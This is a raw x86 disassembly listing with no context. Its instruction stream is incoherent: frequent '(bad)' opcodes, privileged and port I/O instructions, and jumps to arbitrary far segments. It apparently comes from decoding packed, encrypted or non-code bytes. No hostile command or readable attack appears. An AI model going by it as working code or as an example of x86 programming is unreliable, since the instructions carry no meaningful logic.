  416ce1:	xchg   edx,eax
  416ce2:	pop    ss
  416ce3:	jle    0x416cec
  416ce5:	xchg   edx,eax
  416ce6:	sti    
  416ce7:	fucomp st(5)
  416ce9:	repz push esp
  416ceb:	and    ebp,0x9fabdc8
  416cf1:	dec    esi
  416cf2:	mov    esi,0x6c9dd5f7
  416cf7:	aad    0xe
  416cf9:	and    eax,0xc7526ae5
  416cfe:	mov    ebx,0x3d24d4e3
  416d03:	xchg   esp,eax
  416d04:	cld    
  416d05:	push   es
  416d06:	dec    eax
  416d07:	and    al,0xcb
  416d09:	mov    ah,BYTE PTR [ebx]
  416d0b:	dec    ebp
  416d0c:	es out dx,eax
  416d0e:	dec    ecx
  416d0f:	stos   DWORD PTR es:[edi],eax
  416d10:	mov    ah,BYTE PTR [ebp+0x7bf832b7]
  416d16:	test   BYTE PTR [eax+0x310658fe],al
  416d1c:	cld    
  416d1d:	cmp    edx,edx
  416d1f:	xchg   ebp,eax
  416d20:	ins    DWORD PTR es:[edi],dx
  416d21:	rol    DWORD PTR [edx-0x42336db3],cl
  416d27:	fnstenv [esi+0x17]
  416d2a:	js     0x416d8d
  416d2c:	(bad)  
  416d2d:	iret   
  416d2e:	rol    BYTE PTR [ecx+ebp*2],0xd1
  416d32:	(bad)  
  416d33:	or     eax,0xd32bd18a
  416d38:	ja     0x416d59
  416d3a:	sbb    eax,0x3874a0bf
  416d3f:	arpl   dx,ax
  416d41:	cdq    
  416d42:	vmwrite edi,eax
  416d45:	mov    edi,0xc1f34a79
  416d4a:	sbb    DWORD PTR [ebp-0xf31cd24],0x70
  416d51:	loop   0x416da1
  416d53:	hlt    
  416d54:	test   BYTE PTR [edx-0x5f],ah
  416d57:	xor    ebp,eax
  416d59:	aam    0xa4
  416d5b:	jecxz  0x416d26
  416d5d:	inc    eax
  416d5e:	stos   BYTE PTR es:[edi],al
  416d5f:	ins    BYTE PTR es:[edi],dx
  416d60:	dec    edx
  416d61:	ror    DWORD PTR [eax+0x2224b0a],0x1f
  416d68:	loop   0x416d68
  416d6a:	sub    ch,ah
  416d6c:	add    eax,0x74482ef3
  416d71:	cmp    edi,DWORD PTR [edx-0x7db3c320]
  416d77:	xor    esp,DWORD PTR [edi+0x3c4d1a41]
  416d7d:	cmp    al,0xbc
  416d7f:	jmp    0x416d5f
  416d81:	add    al,0xa9
  416d83:	xchg   edx,eax
  416d84:	sub    DWORD PTR [esi],ecx
  416d86:	and    eax,0x3f6e87b8
  416d8b:	std    
  416d8c:	add    ch,bh
  416d8e:	and    dh,BYTE PTR [eax+ebx*1]
  416d91:	ret    0x77d9
  416d94:	jo     0x416d4b
  416d96:	xor    bl,BYTE PTR [esi-0x32bbb497]
  416d9c:	xchg   edx,eax
  416d9d:	push   cs
  416d9e:	dec    ebx
  416d9f:	mov    bh,0xad
  416da1:	adc    esp,DWORD PTR [ebx]
  416da3:	lods   al,BYTE PTR ds:[esi]
  416da4:	stos   DWORD PTR es:[edi],eax
  416da5:	sbb    BYTE PTR [edi+0xe000f41],cl
  416dab:	xchg   edi,eax
  416dac:	jnp    0x416e18
  416dae:	push   cs
  416daf:	fwait
  416db0:	cmc    
  416db1:	adc    DWORD PTR [ebx],edi
  416db3:	and    al,dh
  416db5:	loopne 0x416d42
  416db7:	add    DWORD PTR [esi-0x4c941a2a],esp
  416dbd:	fisub  WORD PTR [edi-0x43]
  416dc0:	iret   
  416dc1:	loop   0x416e35
  416dc3:	imul   DWORD PTR [ebx+eax*1+0x70185ae8]
  416dca:	jge    0x416e31
  416dcc:	inc    ebp
  416dcd:	loopne 0x416dc3
  416dcf:	and    ah,0x2a
  416dd2:	btr    DWORD PTR [ecx],eax
  416dd5:	(bad)  
  416dd6:	jno    0x416e1c
  416dd8:	add    DWORD PTR [edx-0xd2cc708],esi
  416dde:	je     0x416d76
  416de0:	inc    esp
  416de1:	mov    dh,0x1
  416de3:	dec    edx
  416de4:	idiv   esp
  416de6:	ror    BYTE PTR [eax],0xd0
  416de9:	int3   
  416dea:	call   0x66f5:0x70fd79cf
  416df1:	sahf   
  416df2:	and    eax,0xdfe3a5cb
  416df7:	fild   WORD PTR [ebx+0x72]
  416dfa:	out    0x5f,al
  416dfc:	aaa    
  416dfd:	rcr    BYTE PTR [eax-0x2d2fb8d],1
  416e03:	ror    BYTE PTR [ebx+0x5ff9f33],0x4c
  416e0a:	mov    ch,0x7a
  416e0c:	into   
  416e0d:	addr16 pop edx
  416e0f:	sbb    esi,0x928400cc
  416e15:	sahf   
  416e16:	mov    al,0x1e
  416e18:	mov    eax,0x1f7aeb7c
  416e1d:	rol    BYTE PTR [eax-0x319e1b76],cl
  416e23:	mov    ch,0xd2
  416e25:	retf   
  416e26:	mov    ds,WORD PTR [edx+0x1c]
  416e29:	jl     0x416e34
  416e2b:	mov    dh,0xb7
  416e2d:	pop    es
  416e2e:	jne    0x416e29
  416e30:	mov    esi,0xb7096e4c
  416e35:	iret   
  416e36:	or     eax,0xc4dc1c36
  416e3b:	repnz xor ch,BYTE PTR [edi+0x39a7d335]
  416e42:	pop    edx
  416e43:	push   0xffd16a61
  416e48:	mov    al,ds:0xd17d3a44
  416e4d:	sub    ch,BYTE PTR [esi-0x105bad07]
  416e53:	sub    eax,0xab6d7852
  416e58:	push   esp
  416e59:	add    dh,al
  416e5b:	ror    ah,0xb1
  416e5e:	fldenv [ebx-0x7550ebff]
  416e64:	mov    dh,0x5c
  416e66:	enterw 0x7a1c,0xeb
  416e6b:	pop    ebp
  416e6c:	call   FWORD PTR [ebx]
  416e6e:	out    dx,eax
  416e6f:	pop    eax
  416e70:	jne    0x416e99
  416e72:	out    dx,eax
  416e73:	dec    ebx
  416e74:	in     eax,0xe4
  416e76:	xor    BYTE PTR [edx-0x58a3c666],0x46
  416e7d:	outs   dx,BYTE PTR ds:[esi]
  416e7e:	fwait
  416e7f:	imul   ebp,DWORD PTR [eax-0x4c],0x2060d45f
  416e86:	jno    0x416e18
  416e88:	push   ebx
  416e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8a:	pop    ds
  416e8b:	sub    bh,BYTE PTR [ebp-0x34c2a9a0]
  416e91:	in     al,0x2e
  416e93:	in     al,0x37
  416e95:	add    al,BYTE PTR [ecx-0x6c]
  416e98:	sub    edx,esp
  416e9a:	mov    ah,0xa2
  416e9c:	(bad)  
  416e9d:	int3   
  416e9e:	les    ebx,FWORD PTR [ebx]
  416ea0:	loope  0x416e81
  416ea2:	(bad)  
  416ea3:	out    dx,eax
  416ea4:	cmp    ecx,DWORD PTR [ebp-0x7]
  416ea7:	or     BYTE PTR ds:0x71167e1c,ah
  416ead:	(bad)  
  416eae:	pop    esi
  416eaf:	nop
  416eb0:	sbb    eax,0xbfae3ac6
  416eb5:	mov    al,0xbf
  416eb7:	adc    BYTE PTR [edi],al
  416eb9:	sti    
  416eba:	test   eax,ebp
  416ebc:	pusha  
  416ebd:	adc    DWORD PTR [ebx+edx*2-0x383ea8f9],esi
  416ec4:	fcomi  st,st(4)
  416ec6:	les    ecx,FWORD PTR [ecx-0x7439ad8c]
  416ecc:	mov    ebp,0xee68fc16
  416ed1:	dec    edi
  416ed2:	(bad)  
  416ed3:	or     cl,BYTE PTR [ebx-0x4a79d8f3]
  416ed9:	lea    esp,[ecx-0x6aecac58]
  416edf:	dec    esp
  416ee0:	mov    dh,BYTE PTR [ecx-0x1b64c3e6]
  416ee6:	add    ecx,DWORD PTR [ebx+eax*1]
  416ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eea:	sub    ebx,0x7b
  416eed:	in     eax,dx
  416eee:	nop
  416eef:	xor    eax,0x38c69b28
  416ef4:	xor    ah,BYTE PTR [edi+esi*2]
  416ef7:	xor    BYTE PTR [edx-0x66e67cdc],cl
  416efd:	pop    ds
  416efe:	lods   al,BYTE PTR ds:[esi]
  416eff:	stos   BYTE PTR es:[edi],al
  416f00:	mov    al,BYTE PTR [esi+0x18]
  416f03:	addr16 (bad) 
  416f05:	leave  
  416f06:	stos   DWORD PTR es:[edi],eax
  416f07:	xchg   ebp,eax
  416f08:	scas   eax,DWORD PTR es:[edi]
  416f09:	out    0xdf,al
  416f0b:	add    DWORD PTR [ecx+0x6d4218df],ebp
  416f11:	call   0x680:0x690774ba
  416f18:	xchg   ecx,eax
  416f19:	inc    eax
  416f1a:	js     0x416f95
  416f1c:	test   ecx,edx
  416f1e:	lods   al,BYTE PTR ds:[esi]
  416f1f:	sbb    al,0x4c
  416f21:	fnstsw WORD PTR [ebp+0x4bd5091a]
  416f27:	dec    edx
  416f28:	gs popf 
  416f2a:	pop    edi
  416f2b:	and    ebp,esp
  416f2d:	push   ebp
  416f2e:	cdq    
  416f2f:	jle    0x416ec1
  416f31:	lods   al,BYTE PTR ds:[esi]
  416f32:	pop    es
  416f33:	aas    
  416f34:	inc    eax
  416f35:	and    dl,dl
  416f37:	lea    eax,[ebp-0x5c]
  416f3a:	sub    DWORD PTR [edx-0x18f33f9d],esi
  416f40:	ret    0x486d
  416f43:	inc    ecx
  416f44:	icebp  
  416f45:	stc    
  416f46:	mov    ds:0x634ab4a9,al
  416f4b:	jg     0x416f4e
  416f4d:	jge    0x416fcc
  416f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f50:	mov    al,0xd3
  416f52:	mul    esi
  416f54:	and    BYTE PTR [eax+ebp*4-0x68921811],dl
  416f5b:	mov    ecx,0xa34f198d
  416f60:	test   ebp,ecx
  416f62:	call   0x326a:0x60181e59
  416f69:	ds dec edx
  416f6b:	adc    ebx,0x3
  416f6e:	mov    cl,0xac
  416f70:	lods   eax,DWORD PTR ds:[esi]
  416f71:	call   0x14d2f07d
  416f76:	jb     0x416fed
  416f78:	push   edi
  416f79:	jmp    0x416fc0
  416f7b:	xchg   BYTE PTR [ebx-0x69],al
  416f7e:	je     0x416fc1
  416f80:	inc    ebx
  416f81:	cmp    al,0x36
  416f83:	aad    0x0
  416f85:	pop    esp
  416f86:	lahf   
  416f87:	cli    
  416f88:	sahf   
  416f89:	aas    
  416f8a:	jbe    0x416fcf
  416f8c:	and    cl,BYTE PTR ds:0x17e38e2c
  416f92:	sub    ch,bh
  416f94:	js     0x41700d
  416f96:	aaa    
  416f97:	xchg   esp,eax
  416f98:	test   eax,0x22f91e4f
  416f9d:	xchg   ebp,eax
  416f9e:	or     ch,BYTE PTR [ecx-0xd5ca41]
  416fa4:	and    al,0x4b
  416fa6:	xlat   BYTE PTR ds:[ebx]
  416fa7:	jp     0x416fa1
  416fa9:	jns    0x416faf
  416fab:	in     al,dx
  416fac:	fnstenv [ecx+0xd22aa79]
  416fb2:	fwait
  416fb3:	jbe    0x416f80
  416fb5:	fild   WORD PTR [eax+edx*1+0x30]
  416fb9:	mov    ebx,ds
  416fbb:	sbb    DWORD PTR [edx-0x3c],ebx
  416fbe:	and    eax,eax
  416fc0:	cmp    al,0x3b
  416fc2:	das    
  416fc3:	jge    0x417038
  416fc5:	pop    es
  416fc6:	and    DWORD PTR [ebx+edi*1],ecx
  416fc9:	cmp    eax,0x5cb6accd
  416fce:	(bad)  
  416fcf:	xlat   BYTE PTR ds:[ebx]
  416fd0:	push   ebx
  416fd1:	sub    eax,0x9939cb3d
  416fd6:	or     esp,DWORD PTR [ebp+0x2]
  416fd9:	ret    0x9bfc
  416fdc:	loop   0x416fc5
  416fde:	in     al,dx
  416fdf:	mov    ebx,0x2f276f96
  416fe4:	test   BYTE PTR [eax+0x3b],dh
  416fe7:	jnp    0x416fb8
  416fe9:	inc    ecx
  416fea:	je     0x417033
  416fec:	cs inc edx
  416fee:	mov    eax,ds:0x896f2c11
  416ff3:	jp     0x416fca
  416ff5:	add    eax,0xc043eb4d
  416ffa:	dec    ecx
  416ffb:	cmp    eax,0xc6628f78
  417000:	jge    0x417056
  417002:	sub    al,0x5e
  417004:	jb     0x417074
  417006:	xlat   BYTE PTR ds:[ebx]
  417007:	cmp    bh,BYTE PTR [ebp+0x6cbde776]
  41700d:	xchg   esi,eax
  41700e:	aas    
  41700f:	mov    ebp,0xe1be300
  417014:	push   esp
  417015:	idiv   esi
  417017:	xor    edi,DWORD PTR [edx+0x40]
  41701a:	ret    
  41701b:	lds    esi,FWORD PTR [edi+0x21e62acb]
  417021:	push   es
  417022:	scas   al,BYTE PTR es:[edi]
  417023:	mov    edi,DWORD PTR [edx+ebp*8-0x1b]
  417027:	js     0x417048
  417029:	les    esp,FWORD PTR [esi-0x55f65285]
  41702f:	dec    ebp
  417030:	push   0xf9c3dc71
  417035:	cmp    eax,eax
  417037:	xchg   ebx,eax
  417038:	shr    edx,cl
  41703a:	jae    0x417024
  41703c:	push   edx
  41703d:	xor    edx,edi
  41703f:	out    dx,eax
  417040:	les    ebx,FWORD PTR [ecx]
  417042:	adc    bl,BYTE PTR [ecx-0x30a5173d]
  417048:	repnz cmp eax,0xa07ff2f
  41704e:	pop    ebx
  41704f:	jmp    0xbee2:0x40d0555f
  417056:	or     eax,DWORD PTR [esi+0x1c]
  417059:	inc    edx
  41705a:	and    BYTE PTR [edx+0x3d],ah
  41705d:	js     0x417088
  41705f:	fcomp  QWORD PTR [edi]
  417061:	loop   0x416fef
  417063:	pop    ebx
  417064:	rcr    BYTE PTR [ecx-0x137e3ff8],0x3a
  41706b:	or     eax,0x3a8e3355
  417070:	aam    0xb3
  417072:	leave  
  417073:	push   ecx
  417074:	repz jo 0x4170c9
  417077:	and    BYTE PTR [edi*2+0x29a4eddf],cl
  41707e:	adc    eax,0x96b065f4
  417083:	loope  0x417082
  417085:	jl     0x4170f9
  417087:	jbe    0x41700b
  417089:	out    dx,al
  41708a:	jge    0x417096
  41708c:	pop    esp
  41708d:	adc    esi,DWORD PTR [esi]
  41708f:	addr16 mov eax,0x34831ac4
  417095:	enter  0xc52f,0x5a
  417099:	retf   0xa777
  41709c:	jnp    0x4170f5
  41709e:	adc    al,0x8b
  4170a0:	inc    esp
  4170a1:	mov    cl,0x60
  4170a3:	ins    DWORD PTR es:[edi],dx
  4170a4:	push   ds
  4170a5:	mov    esp,0xc78d0bc2
  4170aa:	sbb    al,0x51
  4170ac:	test   esi,ecx
  4170ae:	std    
  4170af:	add    BYTE PTR ds:0x4bc7aa,0xcd
  4170b6:	and    ah,BYTE PTR [ecx]
  4170b8:	mov    esi,0x4fa08394
  4170bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170be:	stos   DWORD PTR es:[edi],eax
  4170bf:	ficom  DWORD PTR [ecx+0x7e8e9a0f]
  4170c5:	cld    
  4170c6:	(bad)  
  4170c8:	cmp    DWORD PTR [esi+0x7b],edi
  4170cb:	(bad)  
  4170cc:	repz mov edx,0x26c7c7ac
  4170d2:	or     esi,DWORD PTR [ecx-0x433ba1b]
  4170d8:	in     al,dx
  4170d9:	or     esi,DWORD PTR [eax+0x7f60b153]
  4170df:	cdq    
  4170e0:	mov    ebp,0x45f01738
  4170e5:	fsubrp st(7),st
  4170e7:	sub    DWORD PTR [edx+0x1f17edd8],0x16
  4170ee:	xor    edx,DWORD PTR [edx+0x43]
  4170f1:	mov    BYTE PTR [di-0x997],ah
  4170f6:	inc    eax
  4170f7:	add    ch,BYTE PTR [ecx-0x6021afce]
  4170fd:	xchg   ebp,eax
  4170fe:	iret   
  4170ff:	daa    
  417100:	pop    ecx
  417101:	jne    0x4170e9
  417103:	arpl   WORD PTR [edi],dx
  417105:	xchg   ebx,eax
  417106:	loop   0x417179
  417108:	pop    esp
  417109:	and    esi,eax
  41710b:	(bad)  
  41710c:	test   DWORD PTR [ebp-0x3fcb10aa],ecx
  417112:	push   cs
  417113:	add    DWORD PTR [ebp+0x58],edx
  417116:	out    0x59,eax
  417118:	jo     0x417112
  41711a:	fwait
  41711b:	mov    dl,0x3e
  41711d:	sub    ah,cl
  41711f:	in     eax,0x37
  417121:	push   ds
  417122:	and    al,ch
  417124:	addr16 ret 
  417126:	loope  0x4170ba
  417128:	sub    edi,esp
  41712a:	xchg   esi,eax
  41712b:	push   ebp
  41712c:	inc    edi
  41712d:	pop    ds
  41712e:	hlt    
  41712f:	mov    ch,0xb1
  417131:	cmc    
  417132:	push   0x1bf00042
  417137:	out    dx,eax
  417138:	ret    0x2ce4
  41713b:	push   ebx
  41713c:	cmp    eax,0xc99d7f53
  417141:	xor    dh,BYTE PTR [ebx]
  417143:	scas   al,BYTE PTR es:[edi]
  417144:	in     al,dx
  417145:	add    DWORD PTR [ecx-0xfd1983f],0xffffffd5
  41714c:	dec    edi
  41714d:	faddp  st(1),st
  41714f:	mov    ds:0xa592f3e9,eax
  417154:	data16 fldcw WORD PTR [esi]
  417157:	popa   
  417158:	pop    edi
  417159:	pop    es
  41715a:	xchg   edi,eax
  41715b:	lods   al,BYTE PTR ds:[esi]
  41715c:	cli    
  41715d:	dec    edi
  41715e:	mov    al,ds:0x78c09bc4
  417163:	aad    0xf7
  417165:	adc    DWORD PTR [ebx+0x6c4b00a0],edx
  41716b:	mov    eax,0x3d8a8fa6
  417170:	mov    ds:0x85a8ae83,eax
  417175:	test   DWORD PTR [esi+0x5112215d],0x97c34524
  41717f:	dec    ebx
  417180:	jecxz  0x417104
  417182:	mov    eax,0x2b6de86f
  417187:	scas   al,BYTE PTR es:[edi]
  417188:	aad    0xb3
  41718a:	imul   edi,DWORD PTR [edx-0x785a5f20],0x25
  417191:	jnp    0x4171c1
  417193:	add    eax,0xef61fe75
  417198:	loopne 0x41713d
  41719a:	and    eax,0xec9ca868
  41719f:	xchg   DWORD PTR ds:0x552b64f2,esi
  4171a5:	fisub  DWORD PTR [ebp-0x4b4dd2c5]
  4171ab:	jecxz  0x4171eb
  4171ad:	pop    edi
  4171ae:	and    cl,BYTE PTR [esi-0x11eb5c53]
  4171b4:	adc    esp,DWORD PTR [ebp+0x47c64af9]
  4171ba:	jl     0x41721e
  4171bc:	add    al,ch
  4171be:	out    dx,eax
  4171bf:	data16 mov al,0x1f
  4171c2:	rol    esi,cl
  4171c4:	pop    es
  4171c5:	mov    al,ds:0x20c4bc79
  4171ca:	mov    bh,0xa7
  4171cc:	iret   
  4171cd:	inc    esi
  4171ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171cf:	aas    
  4171d0:	mov    dh,0x53
  4171d2:	pop    esp
  4171d3:	mov    al,ds:0x6d9d73e3
  4171d8:	sub    esi,ebx
  4171da:	bound  edx,QWORD PTR [edx-0x3b]
  4171dd:	jne    0x4171a3
  4171df:	shl    edi,1
  4171e1:	mov    bh,0x35
  4171e3:	sub    BYTE PTR [esi],0x2d
  4171e6:	or     DWORD PTR [ebx-0x7f97f18c],0x88bed8a
  4171f0:	xchg   ebx,eax
  4171f1:	sub    al,0xce
  4171f3:	sub    ah,BYTE PTR [eax-0x5c]
  4171f6:	mov    ch,bh
  4171f8:	sbb    bl,dh
  4171fa:	rcl    DWORD PTR ds:[eax-0x32],cl
  4171fe:	pop    es
  4171ff:	mov    DWORD PTR [edi+0x0],edi
  417202:	jecxz  0x4171df
  417204:	push   esi
  417205:	lods   al,BYTE PTR ds:[esi]
  417206:	jmp    0x4171db
  417208:	mov    ebp,0x5e945da4
  41720d:	dec    esi
  41720e:	jne    0x4171b2
  417210:	mov    ds:0xbfdaeab4,al
  417215:	and    eax,0x3207d991
  41721a:	inc    ecx
  41721b:	xor    DWORD PTR [ebp+0x5d28592a],0xd570e30f
  417225:	xchg   ebp,eax
  417226:	push   esp
  417227:	cld    
  417228:	mov    ah,0x5b
  41722a:	inc    edi
  41722b:	or     dl,BYTE PTR [ecx+ebp*2+0xd]
  41722f:	lods   al,BYTE PTR ds:[esi]
  417230:	pop    esi
  417231:	popf   
  417232:	out    dx,al
  417233:	push   es
  417234:	fist   WORD PTR [ecx+0x18]
  417237:	add    ebp,DWORD PTR [ebp-0x6e049ae1]
  41723d:	je     0x417221
  41723f:	push   esp
  417240:	dec    ebx
  417241:	and    edx,ebx
  417243:	(bad)  
  417245:	sub    al,dl
  417247:	mov    ds:0xff2df715,al
  41724c:	repnz xor edx,DWORD PTR [eax]
  41724f:	dec    ecx
  417250:	push   edi
  417251:	js     0x41721e
  417253:	es loopne 0x41723d
  417256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417257:	sbb    ch,BYTE PTR [edx-0x61]
  41725a:	popf   
  41725b:	xor    bl,BYTE PTR [ebx-0x64]
  41725e:	pop    ebp
  41725f:	mov    ds:0x69b5761f,eax
  417264:	jmp    0x95ab:0x1247af97
  41726b:	out    0x7a,eax
  41726d:	push   0x2897882
  417272:	or     al,0x4f
  417274:	push   esi
  417275:	or     BYTE PTR [edi+0x8],cl
  417278:	enter  0xfafe,0xbb
  41727c:	or     edx,DWORD PTR [eax+0x201b4f75]
  417282:	sub    eax,0x2b40d624
  417287:	ret    
  417288:	lds    eax,FWORD PTR [eax+ebx*4+0x5c]
  41728c:	shr    esi,cl
  41728e:	sbb    BYTE PTR [esi+ecx*8-0x25682df0],al
  417295:	add    BYTE PTR [ebp-0x61],dh
  417298:	dec    edx
  417299:	mov    esp,0x309f146f
  41729e:	adc    al,ah
  4172a0:	test   eax,0x59f5b55e
  4172a5:	adc    ebx,ebx
  4172a7:	aam    0x5e
  4172a9:	fimul  WORD PTR [ecx+0x5b]
  4172ac:	add    bl,0x5c
  4172af:	add    eax,ebp
  4172b1:	(bad)  
  4172b2:	je     0x417316
  4172b4:	mov    dh,0xc
  4172b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172b7:	pop    edx
  4172b8:	out    dx,eax
  4172b9:	xchg   ebp,eax
  4172ba:	xchg   ebp,eax
  4172bb:	cmp    DWORD PTR [esi],esi
  4172bd:	frstor [eax-0x79]
  4172c0:	shl    DWORD PTR [edi+0x76],0x4f
  4172c4:	(bad)
  4172c7:	jmp    DWORD PTR [eax-0x2f]
  4172ca:	ss sub al,0x17
  4172cd:	(bad)  
  4172cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d0:	or     esi,DWORD PTR [esi+0x40fc8029]
  4172d6:	sahf   
  4172d7:	pop    ds
  4172d8:	dec    eax
  4172d9:	nop
  4172da:	inc    eax
  4172db:	gs loop 0x4172dc
  4172de:	pop    ds
  4172df:	pop    edx
  4172e0:	xor    ebx,esi
  4172e2:	jno    0x41733d
  4172e4:	jle    0x4172cb
  4172e6:	or     edx,edx
  4172e8:	popa   
  4172e9:	nop
  4172ea:	add    eax,0x32bc2346
  4172ef:	pop    ebp
  4172f0:	in     al,0xf6
  4172f2:	cmp    ebp,DWORD PTR [ebp+0x13841bce]
  4172f8:	leave  
  4172f9:	test   DWORD PTR [ecx],esi
  4172fb:	or     ch,BYTE PTR [esi-0x2b185bd2]
  417301:	push   ss
  417302:	push   0x7fe865a7
  417307:	lds    edi,FWORD PTR [eax+0x13]
  41730a:	cmp    BYTE PTR [ebp+ebx*2+0x49],dl
  41730e:	sub    eax,0xb82270fd
  417313:	(bad)  
  417314:	ins    BYTE PTR es:[edi],dx
  417315:	pop    esp
  417316:	clc    
  417317:	in     al,dx
  417318:	push   0x6e
  41731a:	mov    al,0x23
  41731c:	xchg   ebp,eax
  41731d:	cmp    al,0x4f
  41731f:	push   ecx
  417320:	jge    0x4173a0
  417322:	in     eax,dx
  417323:	cmp    ecx,DWORD PTR [ecx-0x39563ff1]
  417329:	nop
  41732a:	sar    DWORD PTR [ecx+ecx*8-0x36],cl
  41732e:	mov    edi,0x89005580
  417333:	stc    
  417334:	push   ss
  417335:	pop    esp
  417336:	gs ins DWORD PTR es:[edi],dx
  417338:	pop    eax
  417339:	push   edi
  41733a:	mov    esi,0x93a101ff
  41733f:	push   es
  417340:	ror    BYTE PTR [edi-0x51579d87],0xc
  417347:	mov    ebx,0x9b775cb2
  41734c:	or     eax,0xcf14d32e
  417351:	in     eax,dx
  417352:	or     al,0xe
  417354:	lods   eax,DWORD PTR ds:[esi]
  417355:	loope  0x4173af
  417357:	je     0x417349
  417359:	pop    edi
  41735a:	jno    0x417349
  41735c:	(bad)  
  41735d:	ffree  st(7)
  41735f:	sbb    eax,0x3c22dd85
  417364:	addr16 inc esp
  417366:	pop    ebx
  417367:	pusha  
  417368:	cs popa 
  41736a:	mov    eax,ds:0x8dcd6739
  41736f:	(bad)  
  417370:	cwde   
  417371:	cmp    eax,esi
  417373:	jl     0x4173ee
  417375:	cmp    esi,DWORD PTR [ebx]
  417377:	mov    edx,0x4fc2997e
  41737c:	pop    es
  41737d:	adc    eax,0x15dbe238
  417382:	jmp    0x4173a2
  417384:	dec    ebx
  417385:	jecxz  0x417307
  417387:	std    
  417388:	sub    edi,DWORD PTR [ebx]
  41738a:	std    
  41738b:	fwait
  41738c:	sub    al,0x1b
  41738e:	or     DWORD PTR ds:[edi+0x5a5e254a],0x4a
  417396:	dec    esp
  417397:	or     BYTE PTR [ebp-0x67],ch
  41739a:	mov    ebx,0x6ad9cd92
  41739f:	mov    edx,0xd90bbd3c
  4173a4:	aam    0xab
  4173a6:	inc    eax
  4173a7:	in     al,dx
  4173a8:	xor    DWORD PTR [eax-0x7f],edi
  4173ab:	shl    DWORD PTR ds:0x458dbdde,1
  4173b1:	cmp    edx,DWORD PTR [esi+0x69548bbf]
  4173b7:	or     bl,al
  4173b9:	iret   
  4173ba:	test   ecx,0x8024c7df
  4173c0:	xor    dl,dl
  4173c2:	jae    0x4173e4
  4173c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c5:	retf   0xeaec
  4173c8:	aaa    
  4173c9:	lock cmp eax,0x3ba64607
  4173cf:	push   ebx
  4173d0:	cmp    ch,0x2
  4173d3:	jmp    0x9047:0x67c7dab4
  4173da:	cmc    
  4173db:	stos   BYTE PTR es:[edi],al
  4173dc:	call   0xb7e6ef3a
  4173e1:	add    DWORD PTR [esi+0x5f],ebx
  4173e4:	jmp    0x41739a
  4173e6:	inc    eax
  4173e7:	sbb    ebx,ecx
  4173e9:	add    cl,ah
  4173eb:	fistp  WORD PTR [edx+0x4f]
  4173ee:	or     esi,DWORD PTR [ebp-0x2643fbb1]
  4173f4:	pusha  
  4173f5:	scas   al,BYTE PTR es:[edi]
  4173f6:	xchg   edx,eax
  4173f7:	jg     0x41743a
  4173f9:	or     BYTE PTR [ebx],ah
  4173fb:	inc    edx
  4173fc:	jae    0x417393
  4173fe:	adc    eax,0xbf8d355a
  417403:	mov    dh,0x1f
  417405:	popa   
  417406:	sub    esp,ebp
  417408:	cmc    
  417409:	push   eax
  41740a:	lods   eax,DWORD PTR ds:[esi]
  41740b:	repnz add al,0xd1
  41740e:	push   esi
  41740f:	loopne 0x41739c
  417411:	inc    edi
  417412:	pushf  
  417413:	ret    
  417414:	push   cs
  417415:	adc    BYTE PTR [ebx+0x4c],cl
  417418:	cmp    BYTE PTR [ecx],cl
  41741a:	jb     0x417407
  41741c:	aam    0xc5
  41741e:	shl    DWORD PTR [edi+0x42],cl
  417421:	xchg   ecx,eax
  417422:	push   cs
  417423:	or     al,0x24
  417425:	mov    eax,cs:0x50e0a16f
  41742b:	out    0xf3,al
  41742d:	inc    ecx
  41742e:	(bad)  
  41742f:	enter  0xf8ea,0x94
  417433:	jne    0x4173f1
  417435:	inc    ebp
  417436:	xchg   BYTE PTR ds:0x2ba897fb,bh
  41743c:	inc    ebx
  41743d:	and    bh,BYTE PTR [esi-0x36a4ee3e]
  417443:	adc    eax,eax
  417445:	add    ebx,DWORD PTR [esi-0x78c6974]
  41744b:	lods   al,BYTE PTR ds:[esi]
  41744c:	ja     0x41740f
  41744e:	mov    edx,esi
  417450:	add    al,0x7e
  417452:	rol    eax,1
  417454:	mov    ecx,0xd67b2e7
  417459:	out    0x2b,eax
  41745b:	es (bad) 
  41745e:	add    dh,BYTE PTR [ecx-0x2d23e477]
  417464:	outs   dx,BYTE PTR ds:[esi]
  417465:	xor    esp,DWORD PTR [esi-0x74712515]
  41746b:	int3   
  41746c:	xchg   ecx,eax
  41746d:	jmp    0x8cb6:0x3f277fe7
  417474:	cdq    
  417475:	ds xchg ebx,eax
  417477:	add    al,0x3b
  417479:	hlt    
  41747a:	test   al,0xa8
  41747c:	mov    dh,0x6b
  41747e:	sbb    ecx,DWORD PTR [ecx+0x146c7488]
  417484:	std    
  417485:	inc    esp
  417486:	lock dec edi
  417488:	in     al,0x61
  41748a:	jmp    0xe7e01111
  41748f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417490:	test   al,0x64
  417492:	sbb    DWORD PTR [ecx+0x4b],ebx
  417495:	cdq    
  417496:	mov    al,ds:0x900796cf
  41749b:	pop    ebp
  41749c:	call   0x91ef33c6
  4174a1:	xchg   esi,eax
  4174a2:	inc    ebx
  4174a3:	add    eax,0xe9e0fe8c
  4174a8:	and    BYTE PTR [edi+0x2377efa8],bl
  4174ae:	lahf   
  4174af:	inc    esp
  4174b0:	adc    edi,DWORD PTR [eax+edx*4]
  4174b3:	or     dh,bl
  4174b5:	rol    DWORD PTR [edi],0x6f
  4174b8:	or     al,0xd4
  4174ba:	stc    
  4174bb:	mov    DWORD PTR [edx-0x2fb98f45],ecx
  4174c1:	inc    ecx
  4174c2:	repz sub al,0xc
  4174c5:	xor    ah,BYTE PTR [esi]
  4174c7:	mov    ah,BYTE PTR [ecx]
  4174c9:	cmp    BYTE PTR [ecx+eiz*1],bl
  4174cc:	iret   
  4174cd:	push   ss
  4174ce:	hlt    
  4174cf:	dec    edi
  4174d0:	adc    dl,ch
  4174d2:	jle    0x41753e
  4174d4:	pop    ebx
  4174d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174d6:	adc    esi,DWORD PTR [ecx+0x39]
  4174d9:	adc    esi,DWORD PTR [edi]
  4174db:	aad    0xac
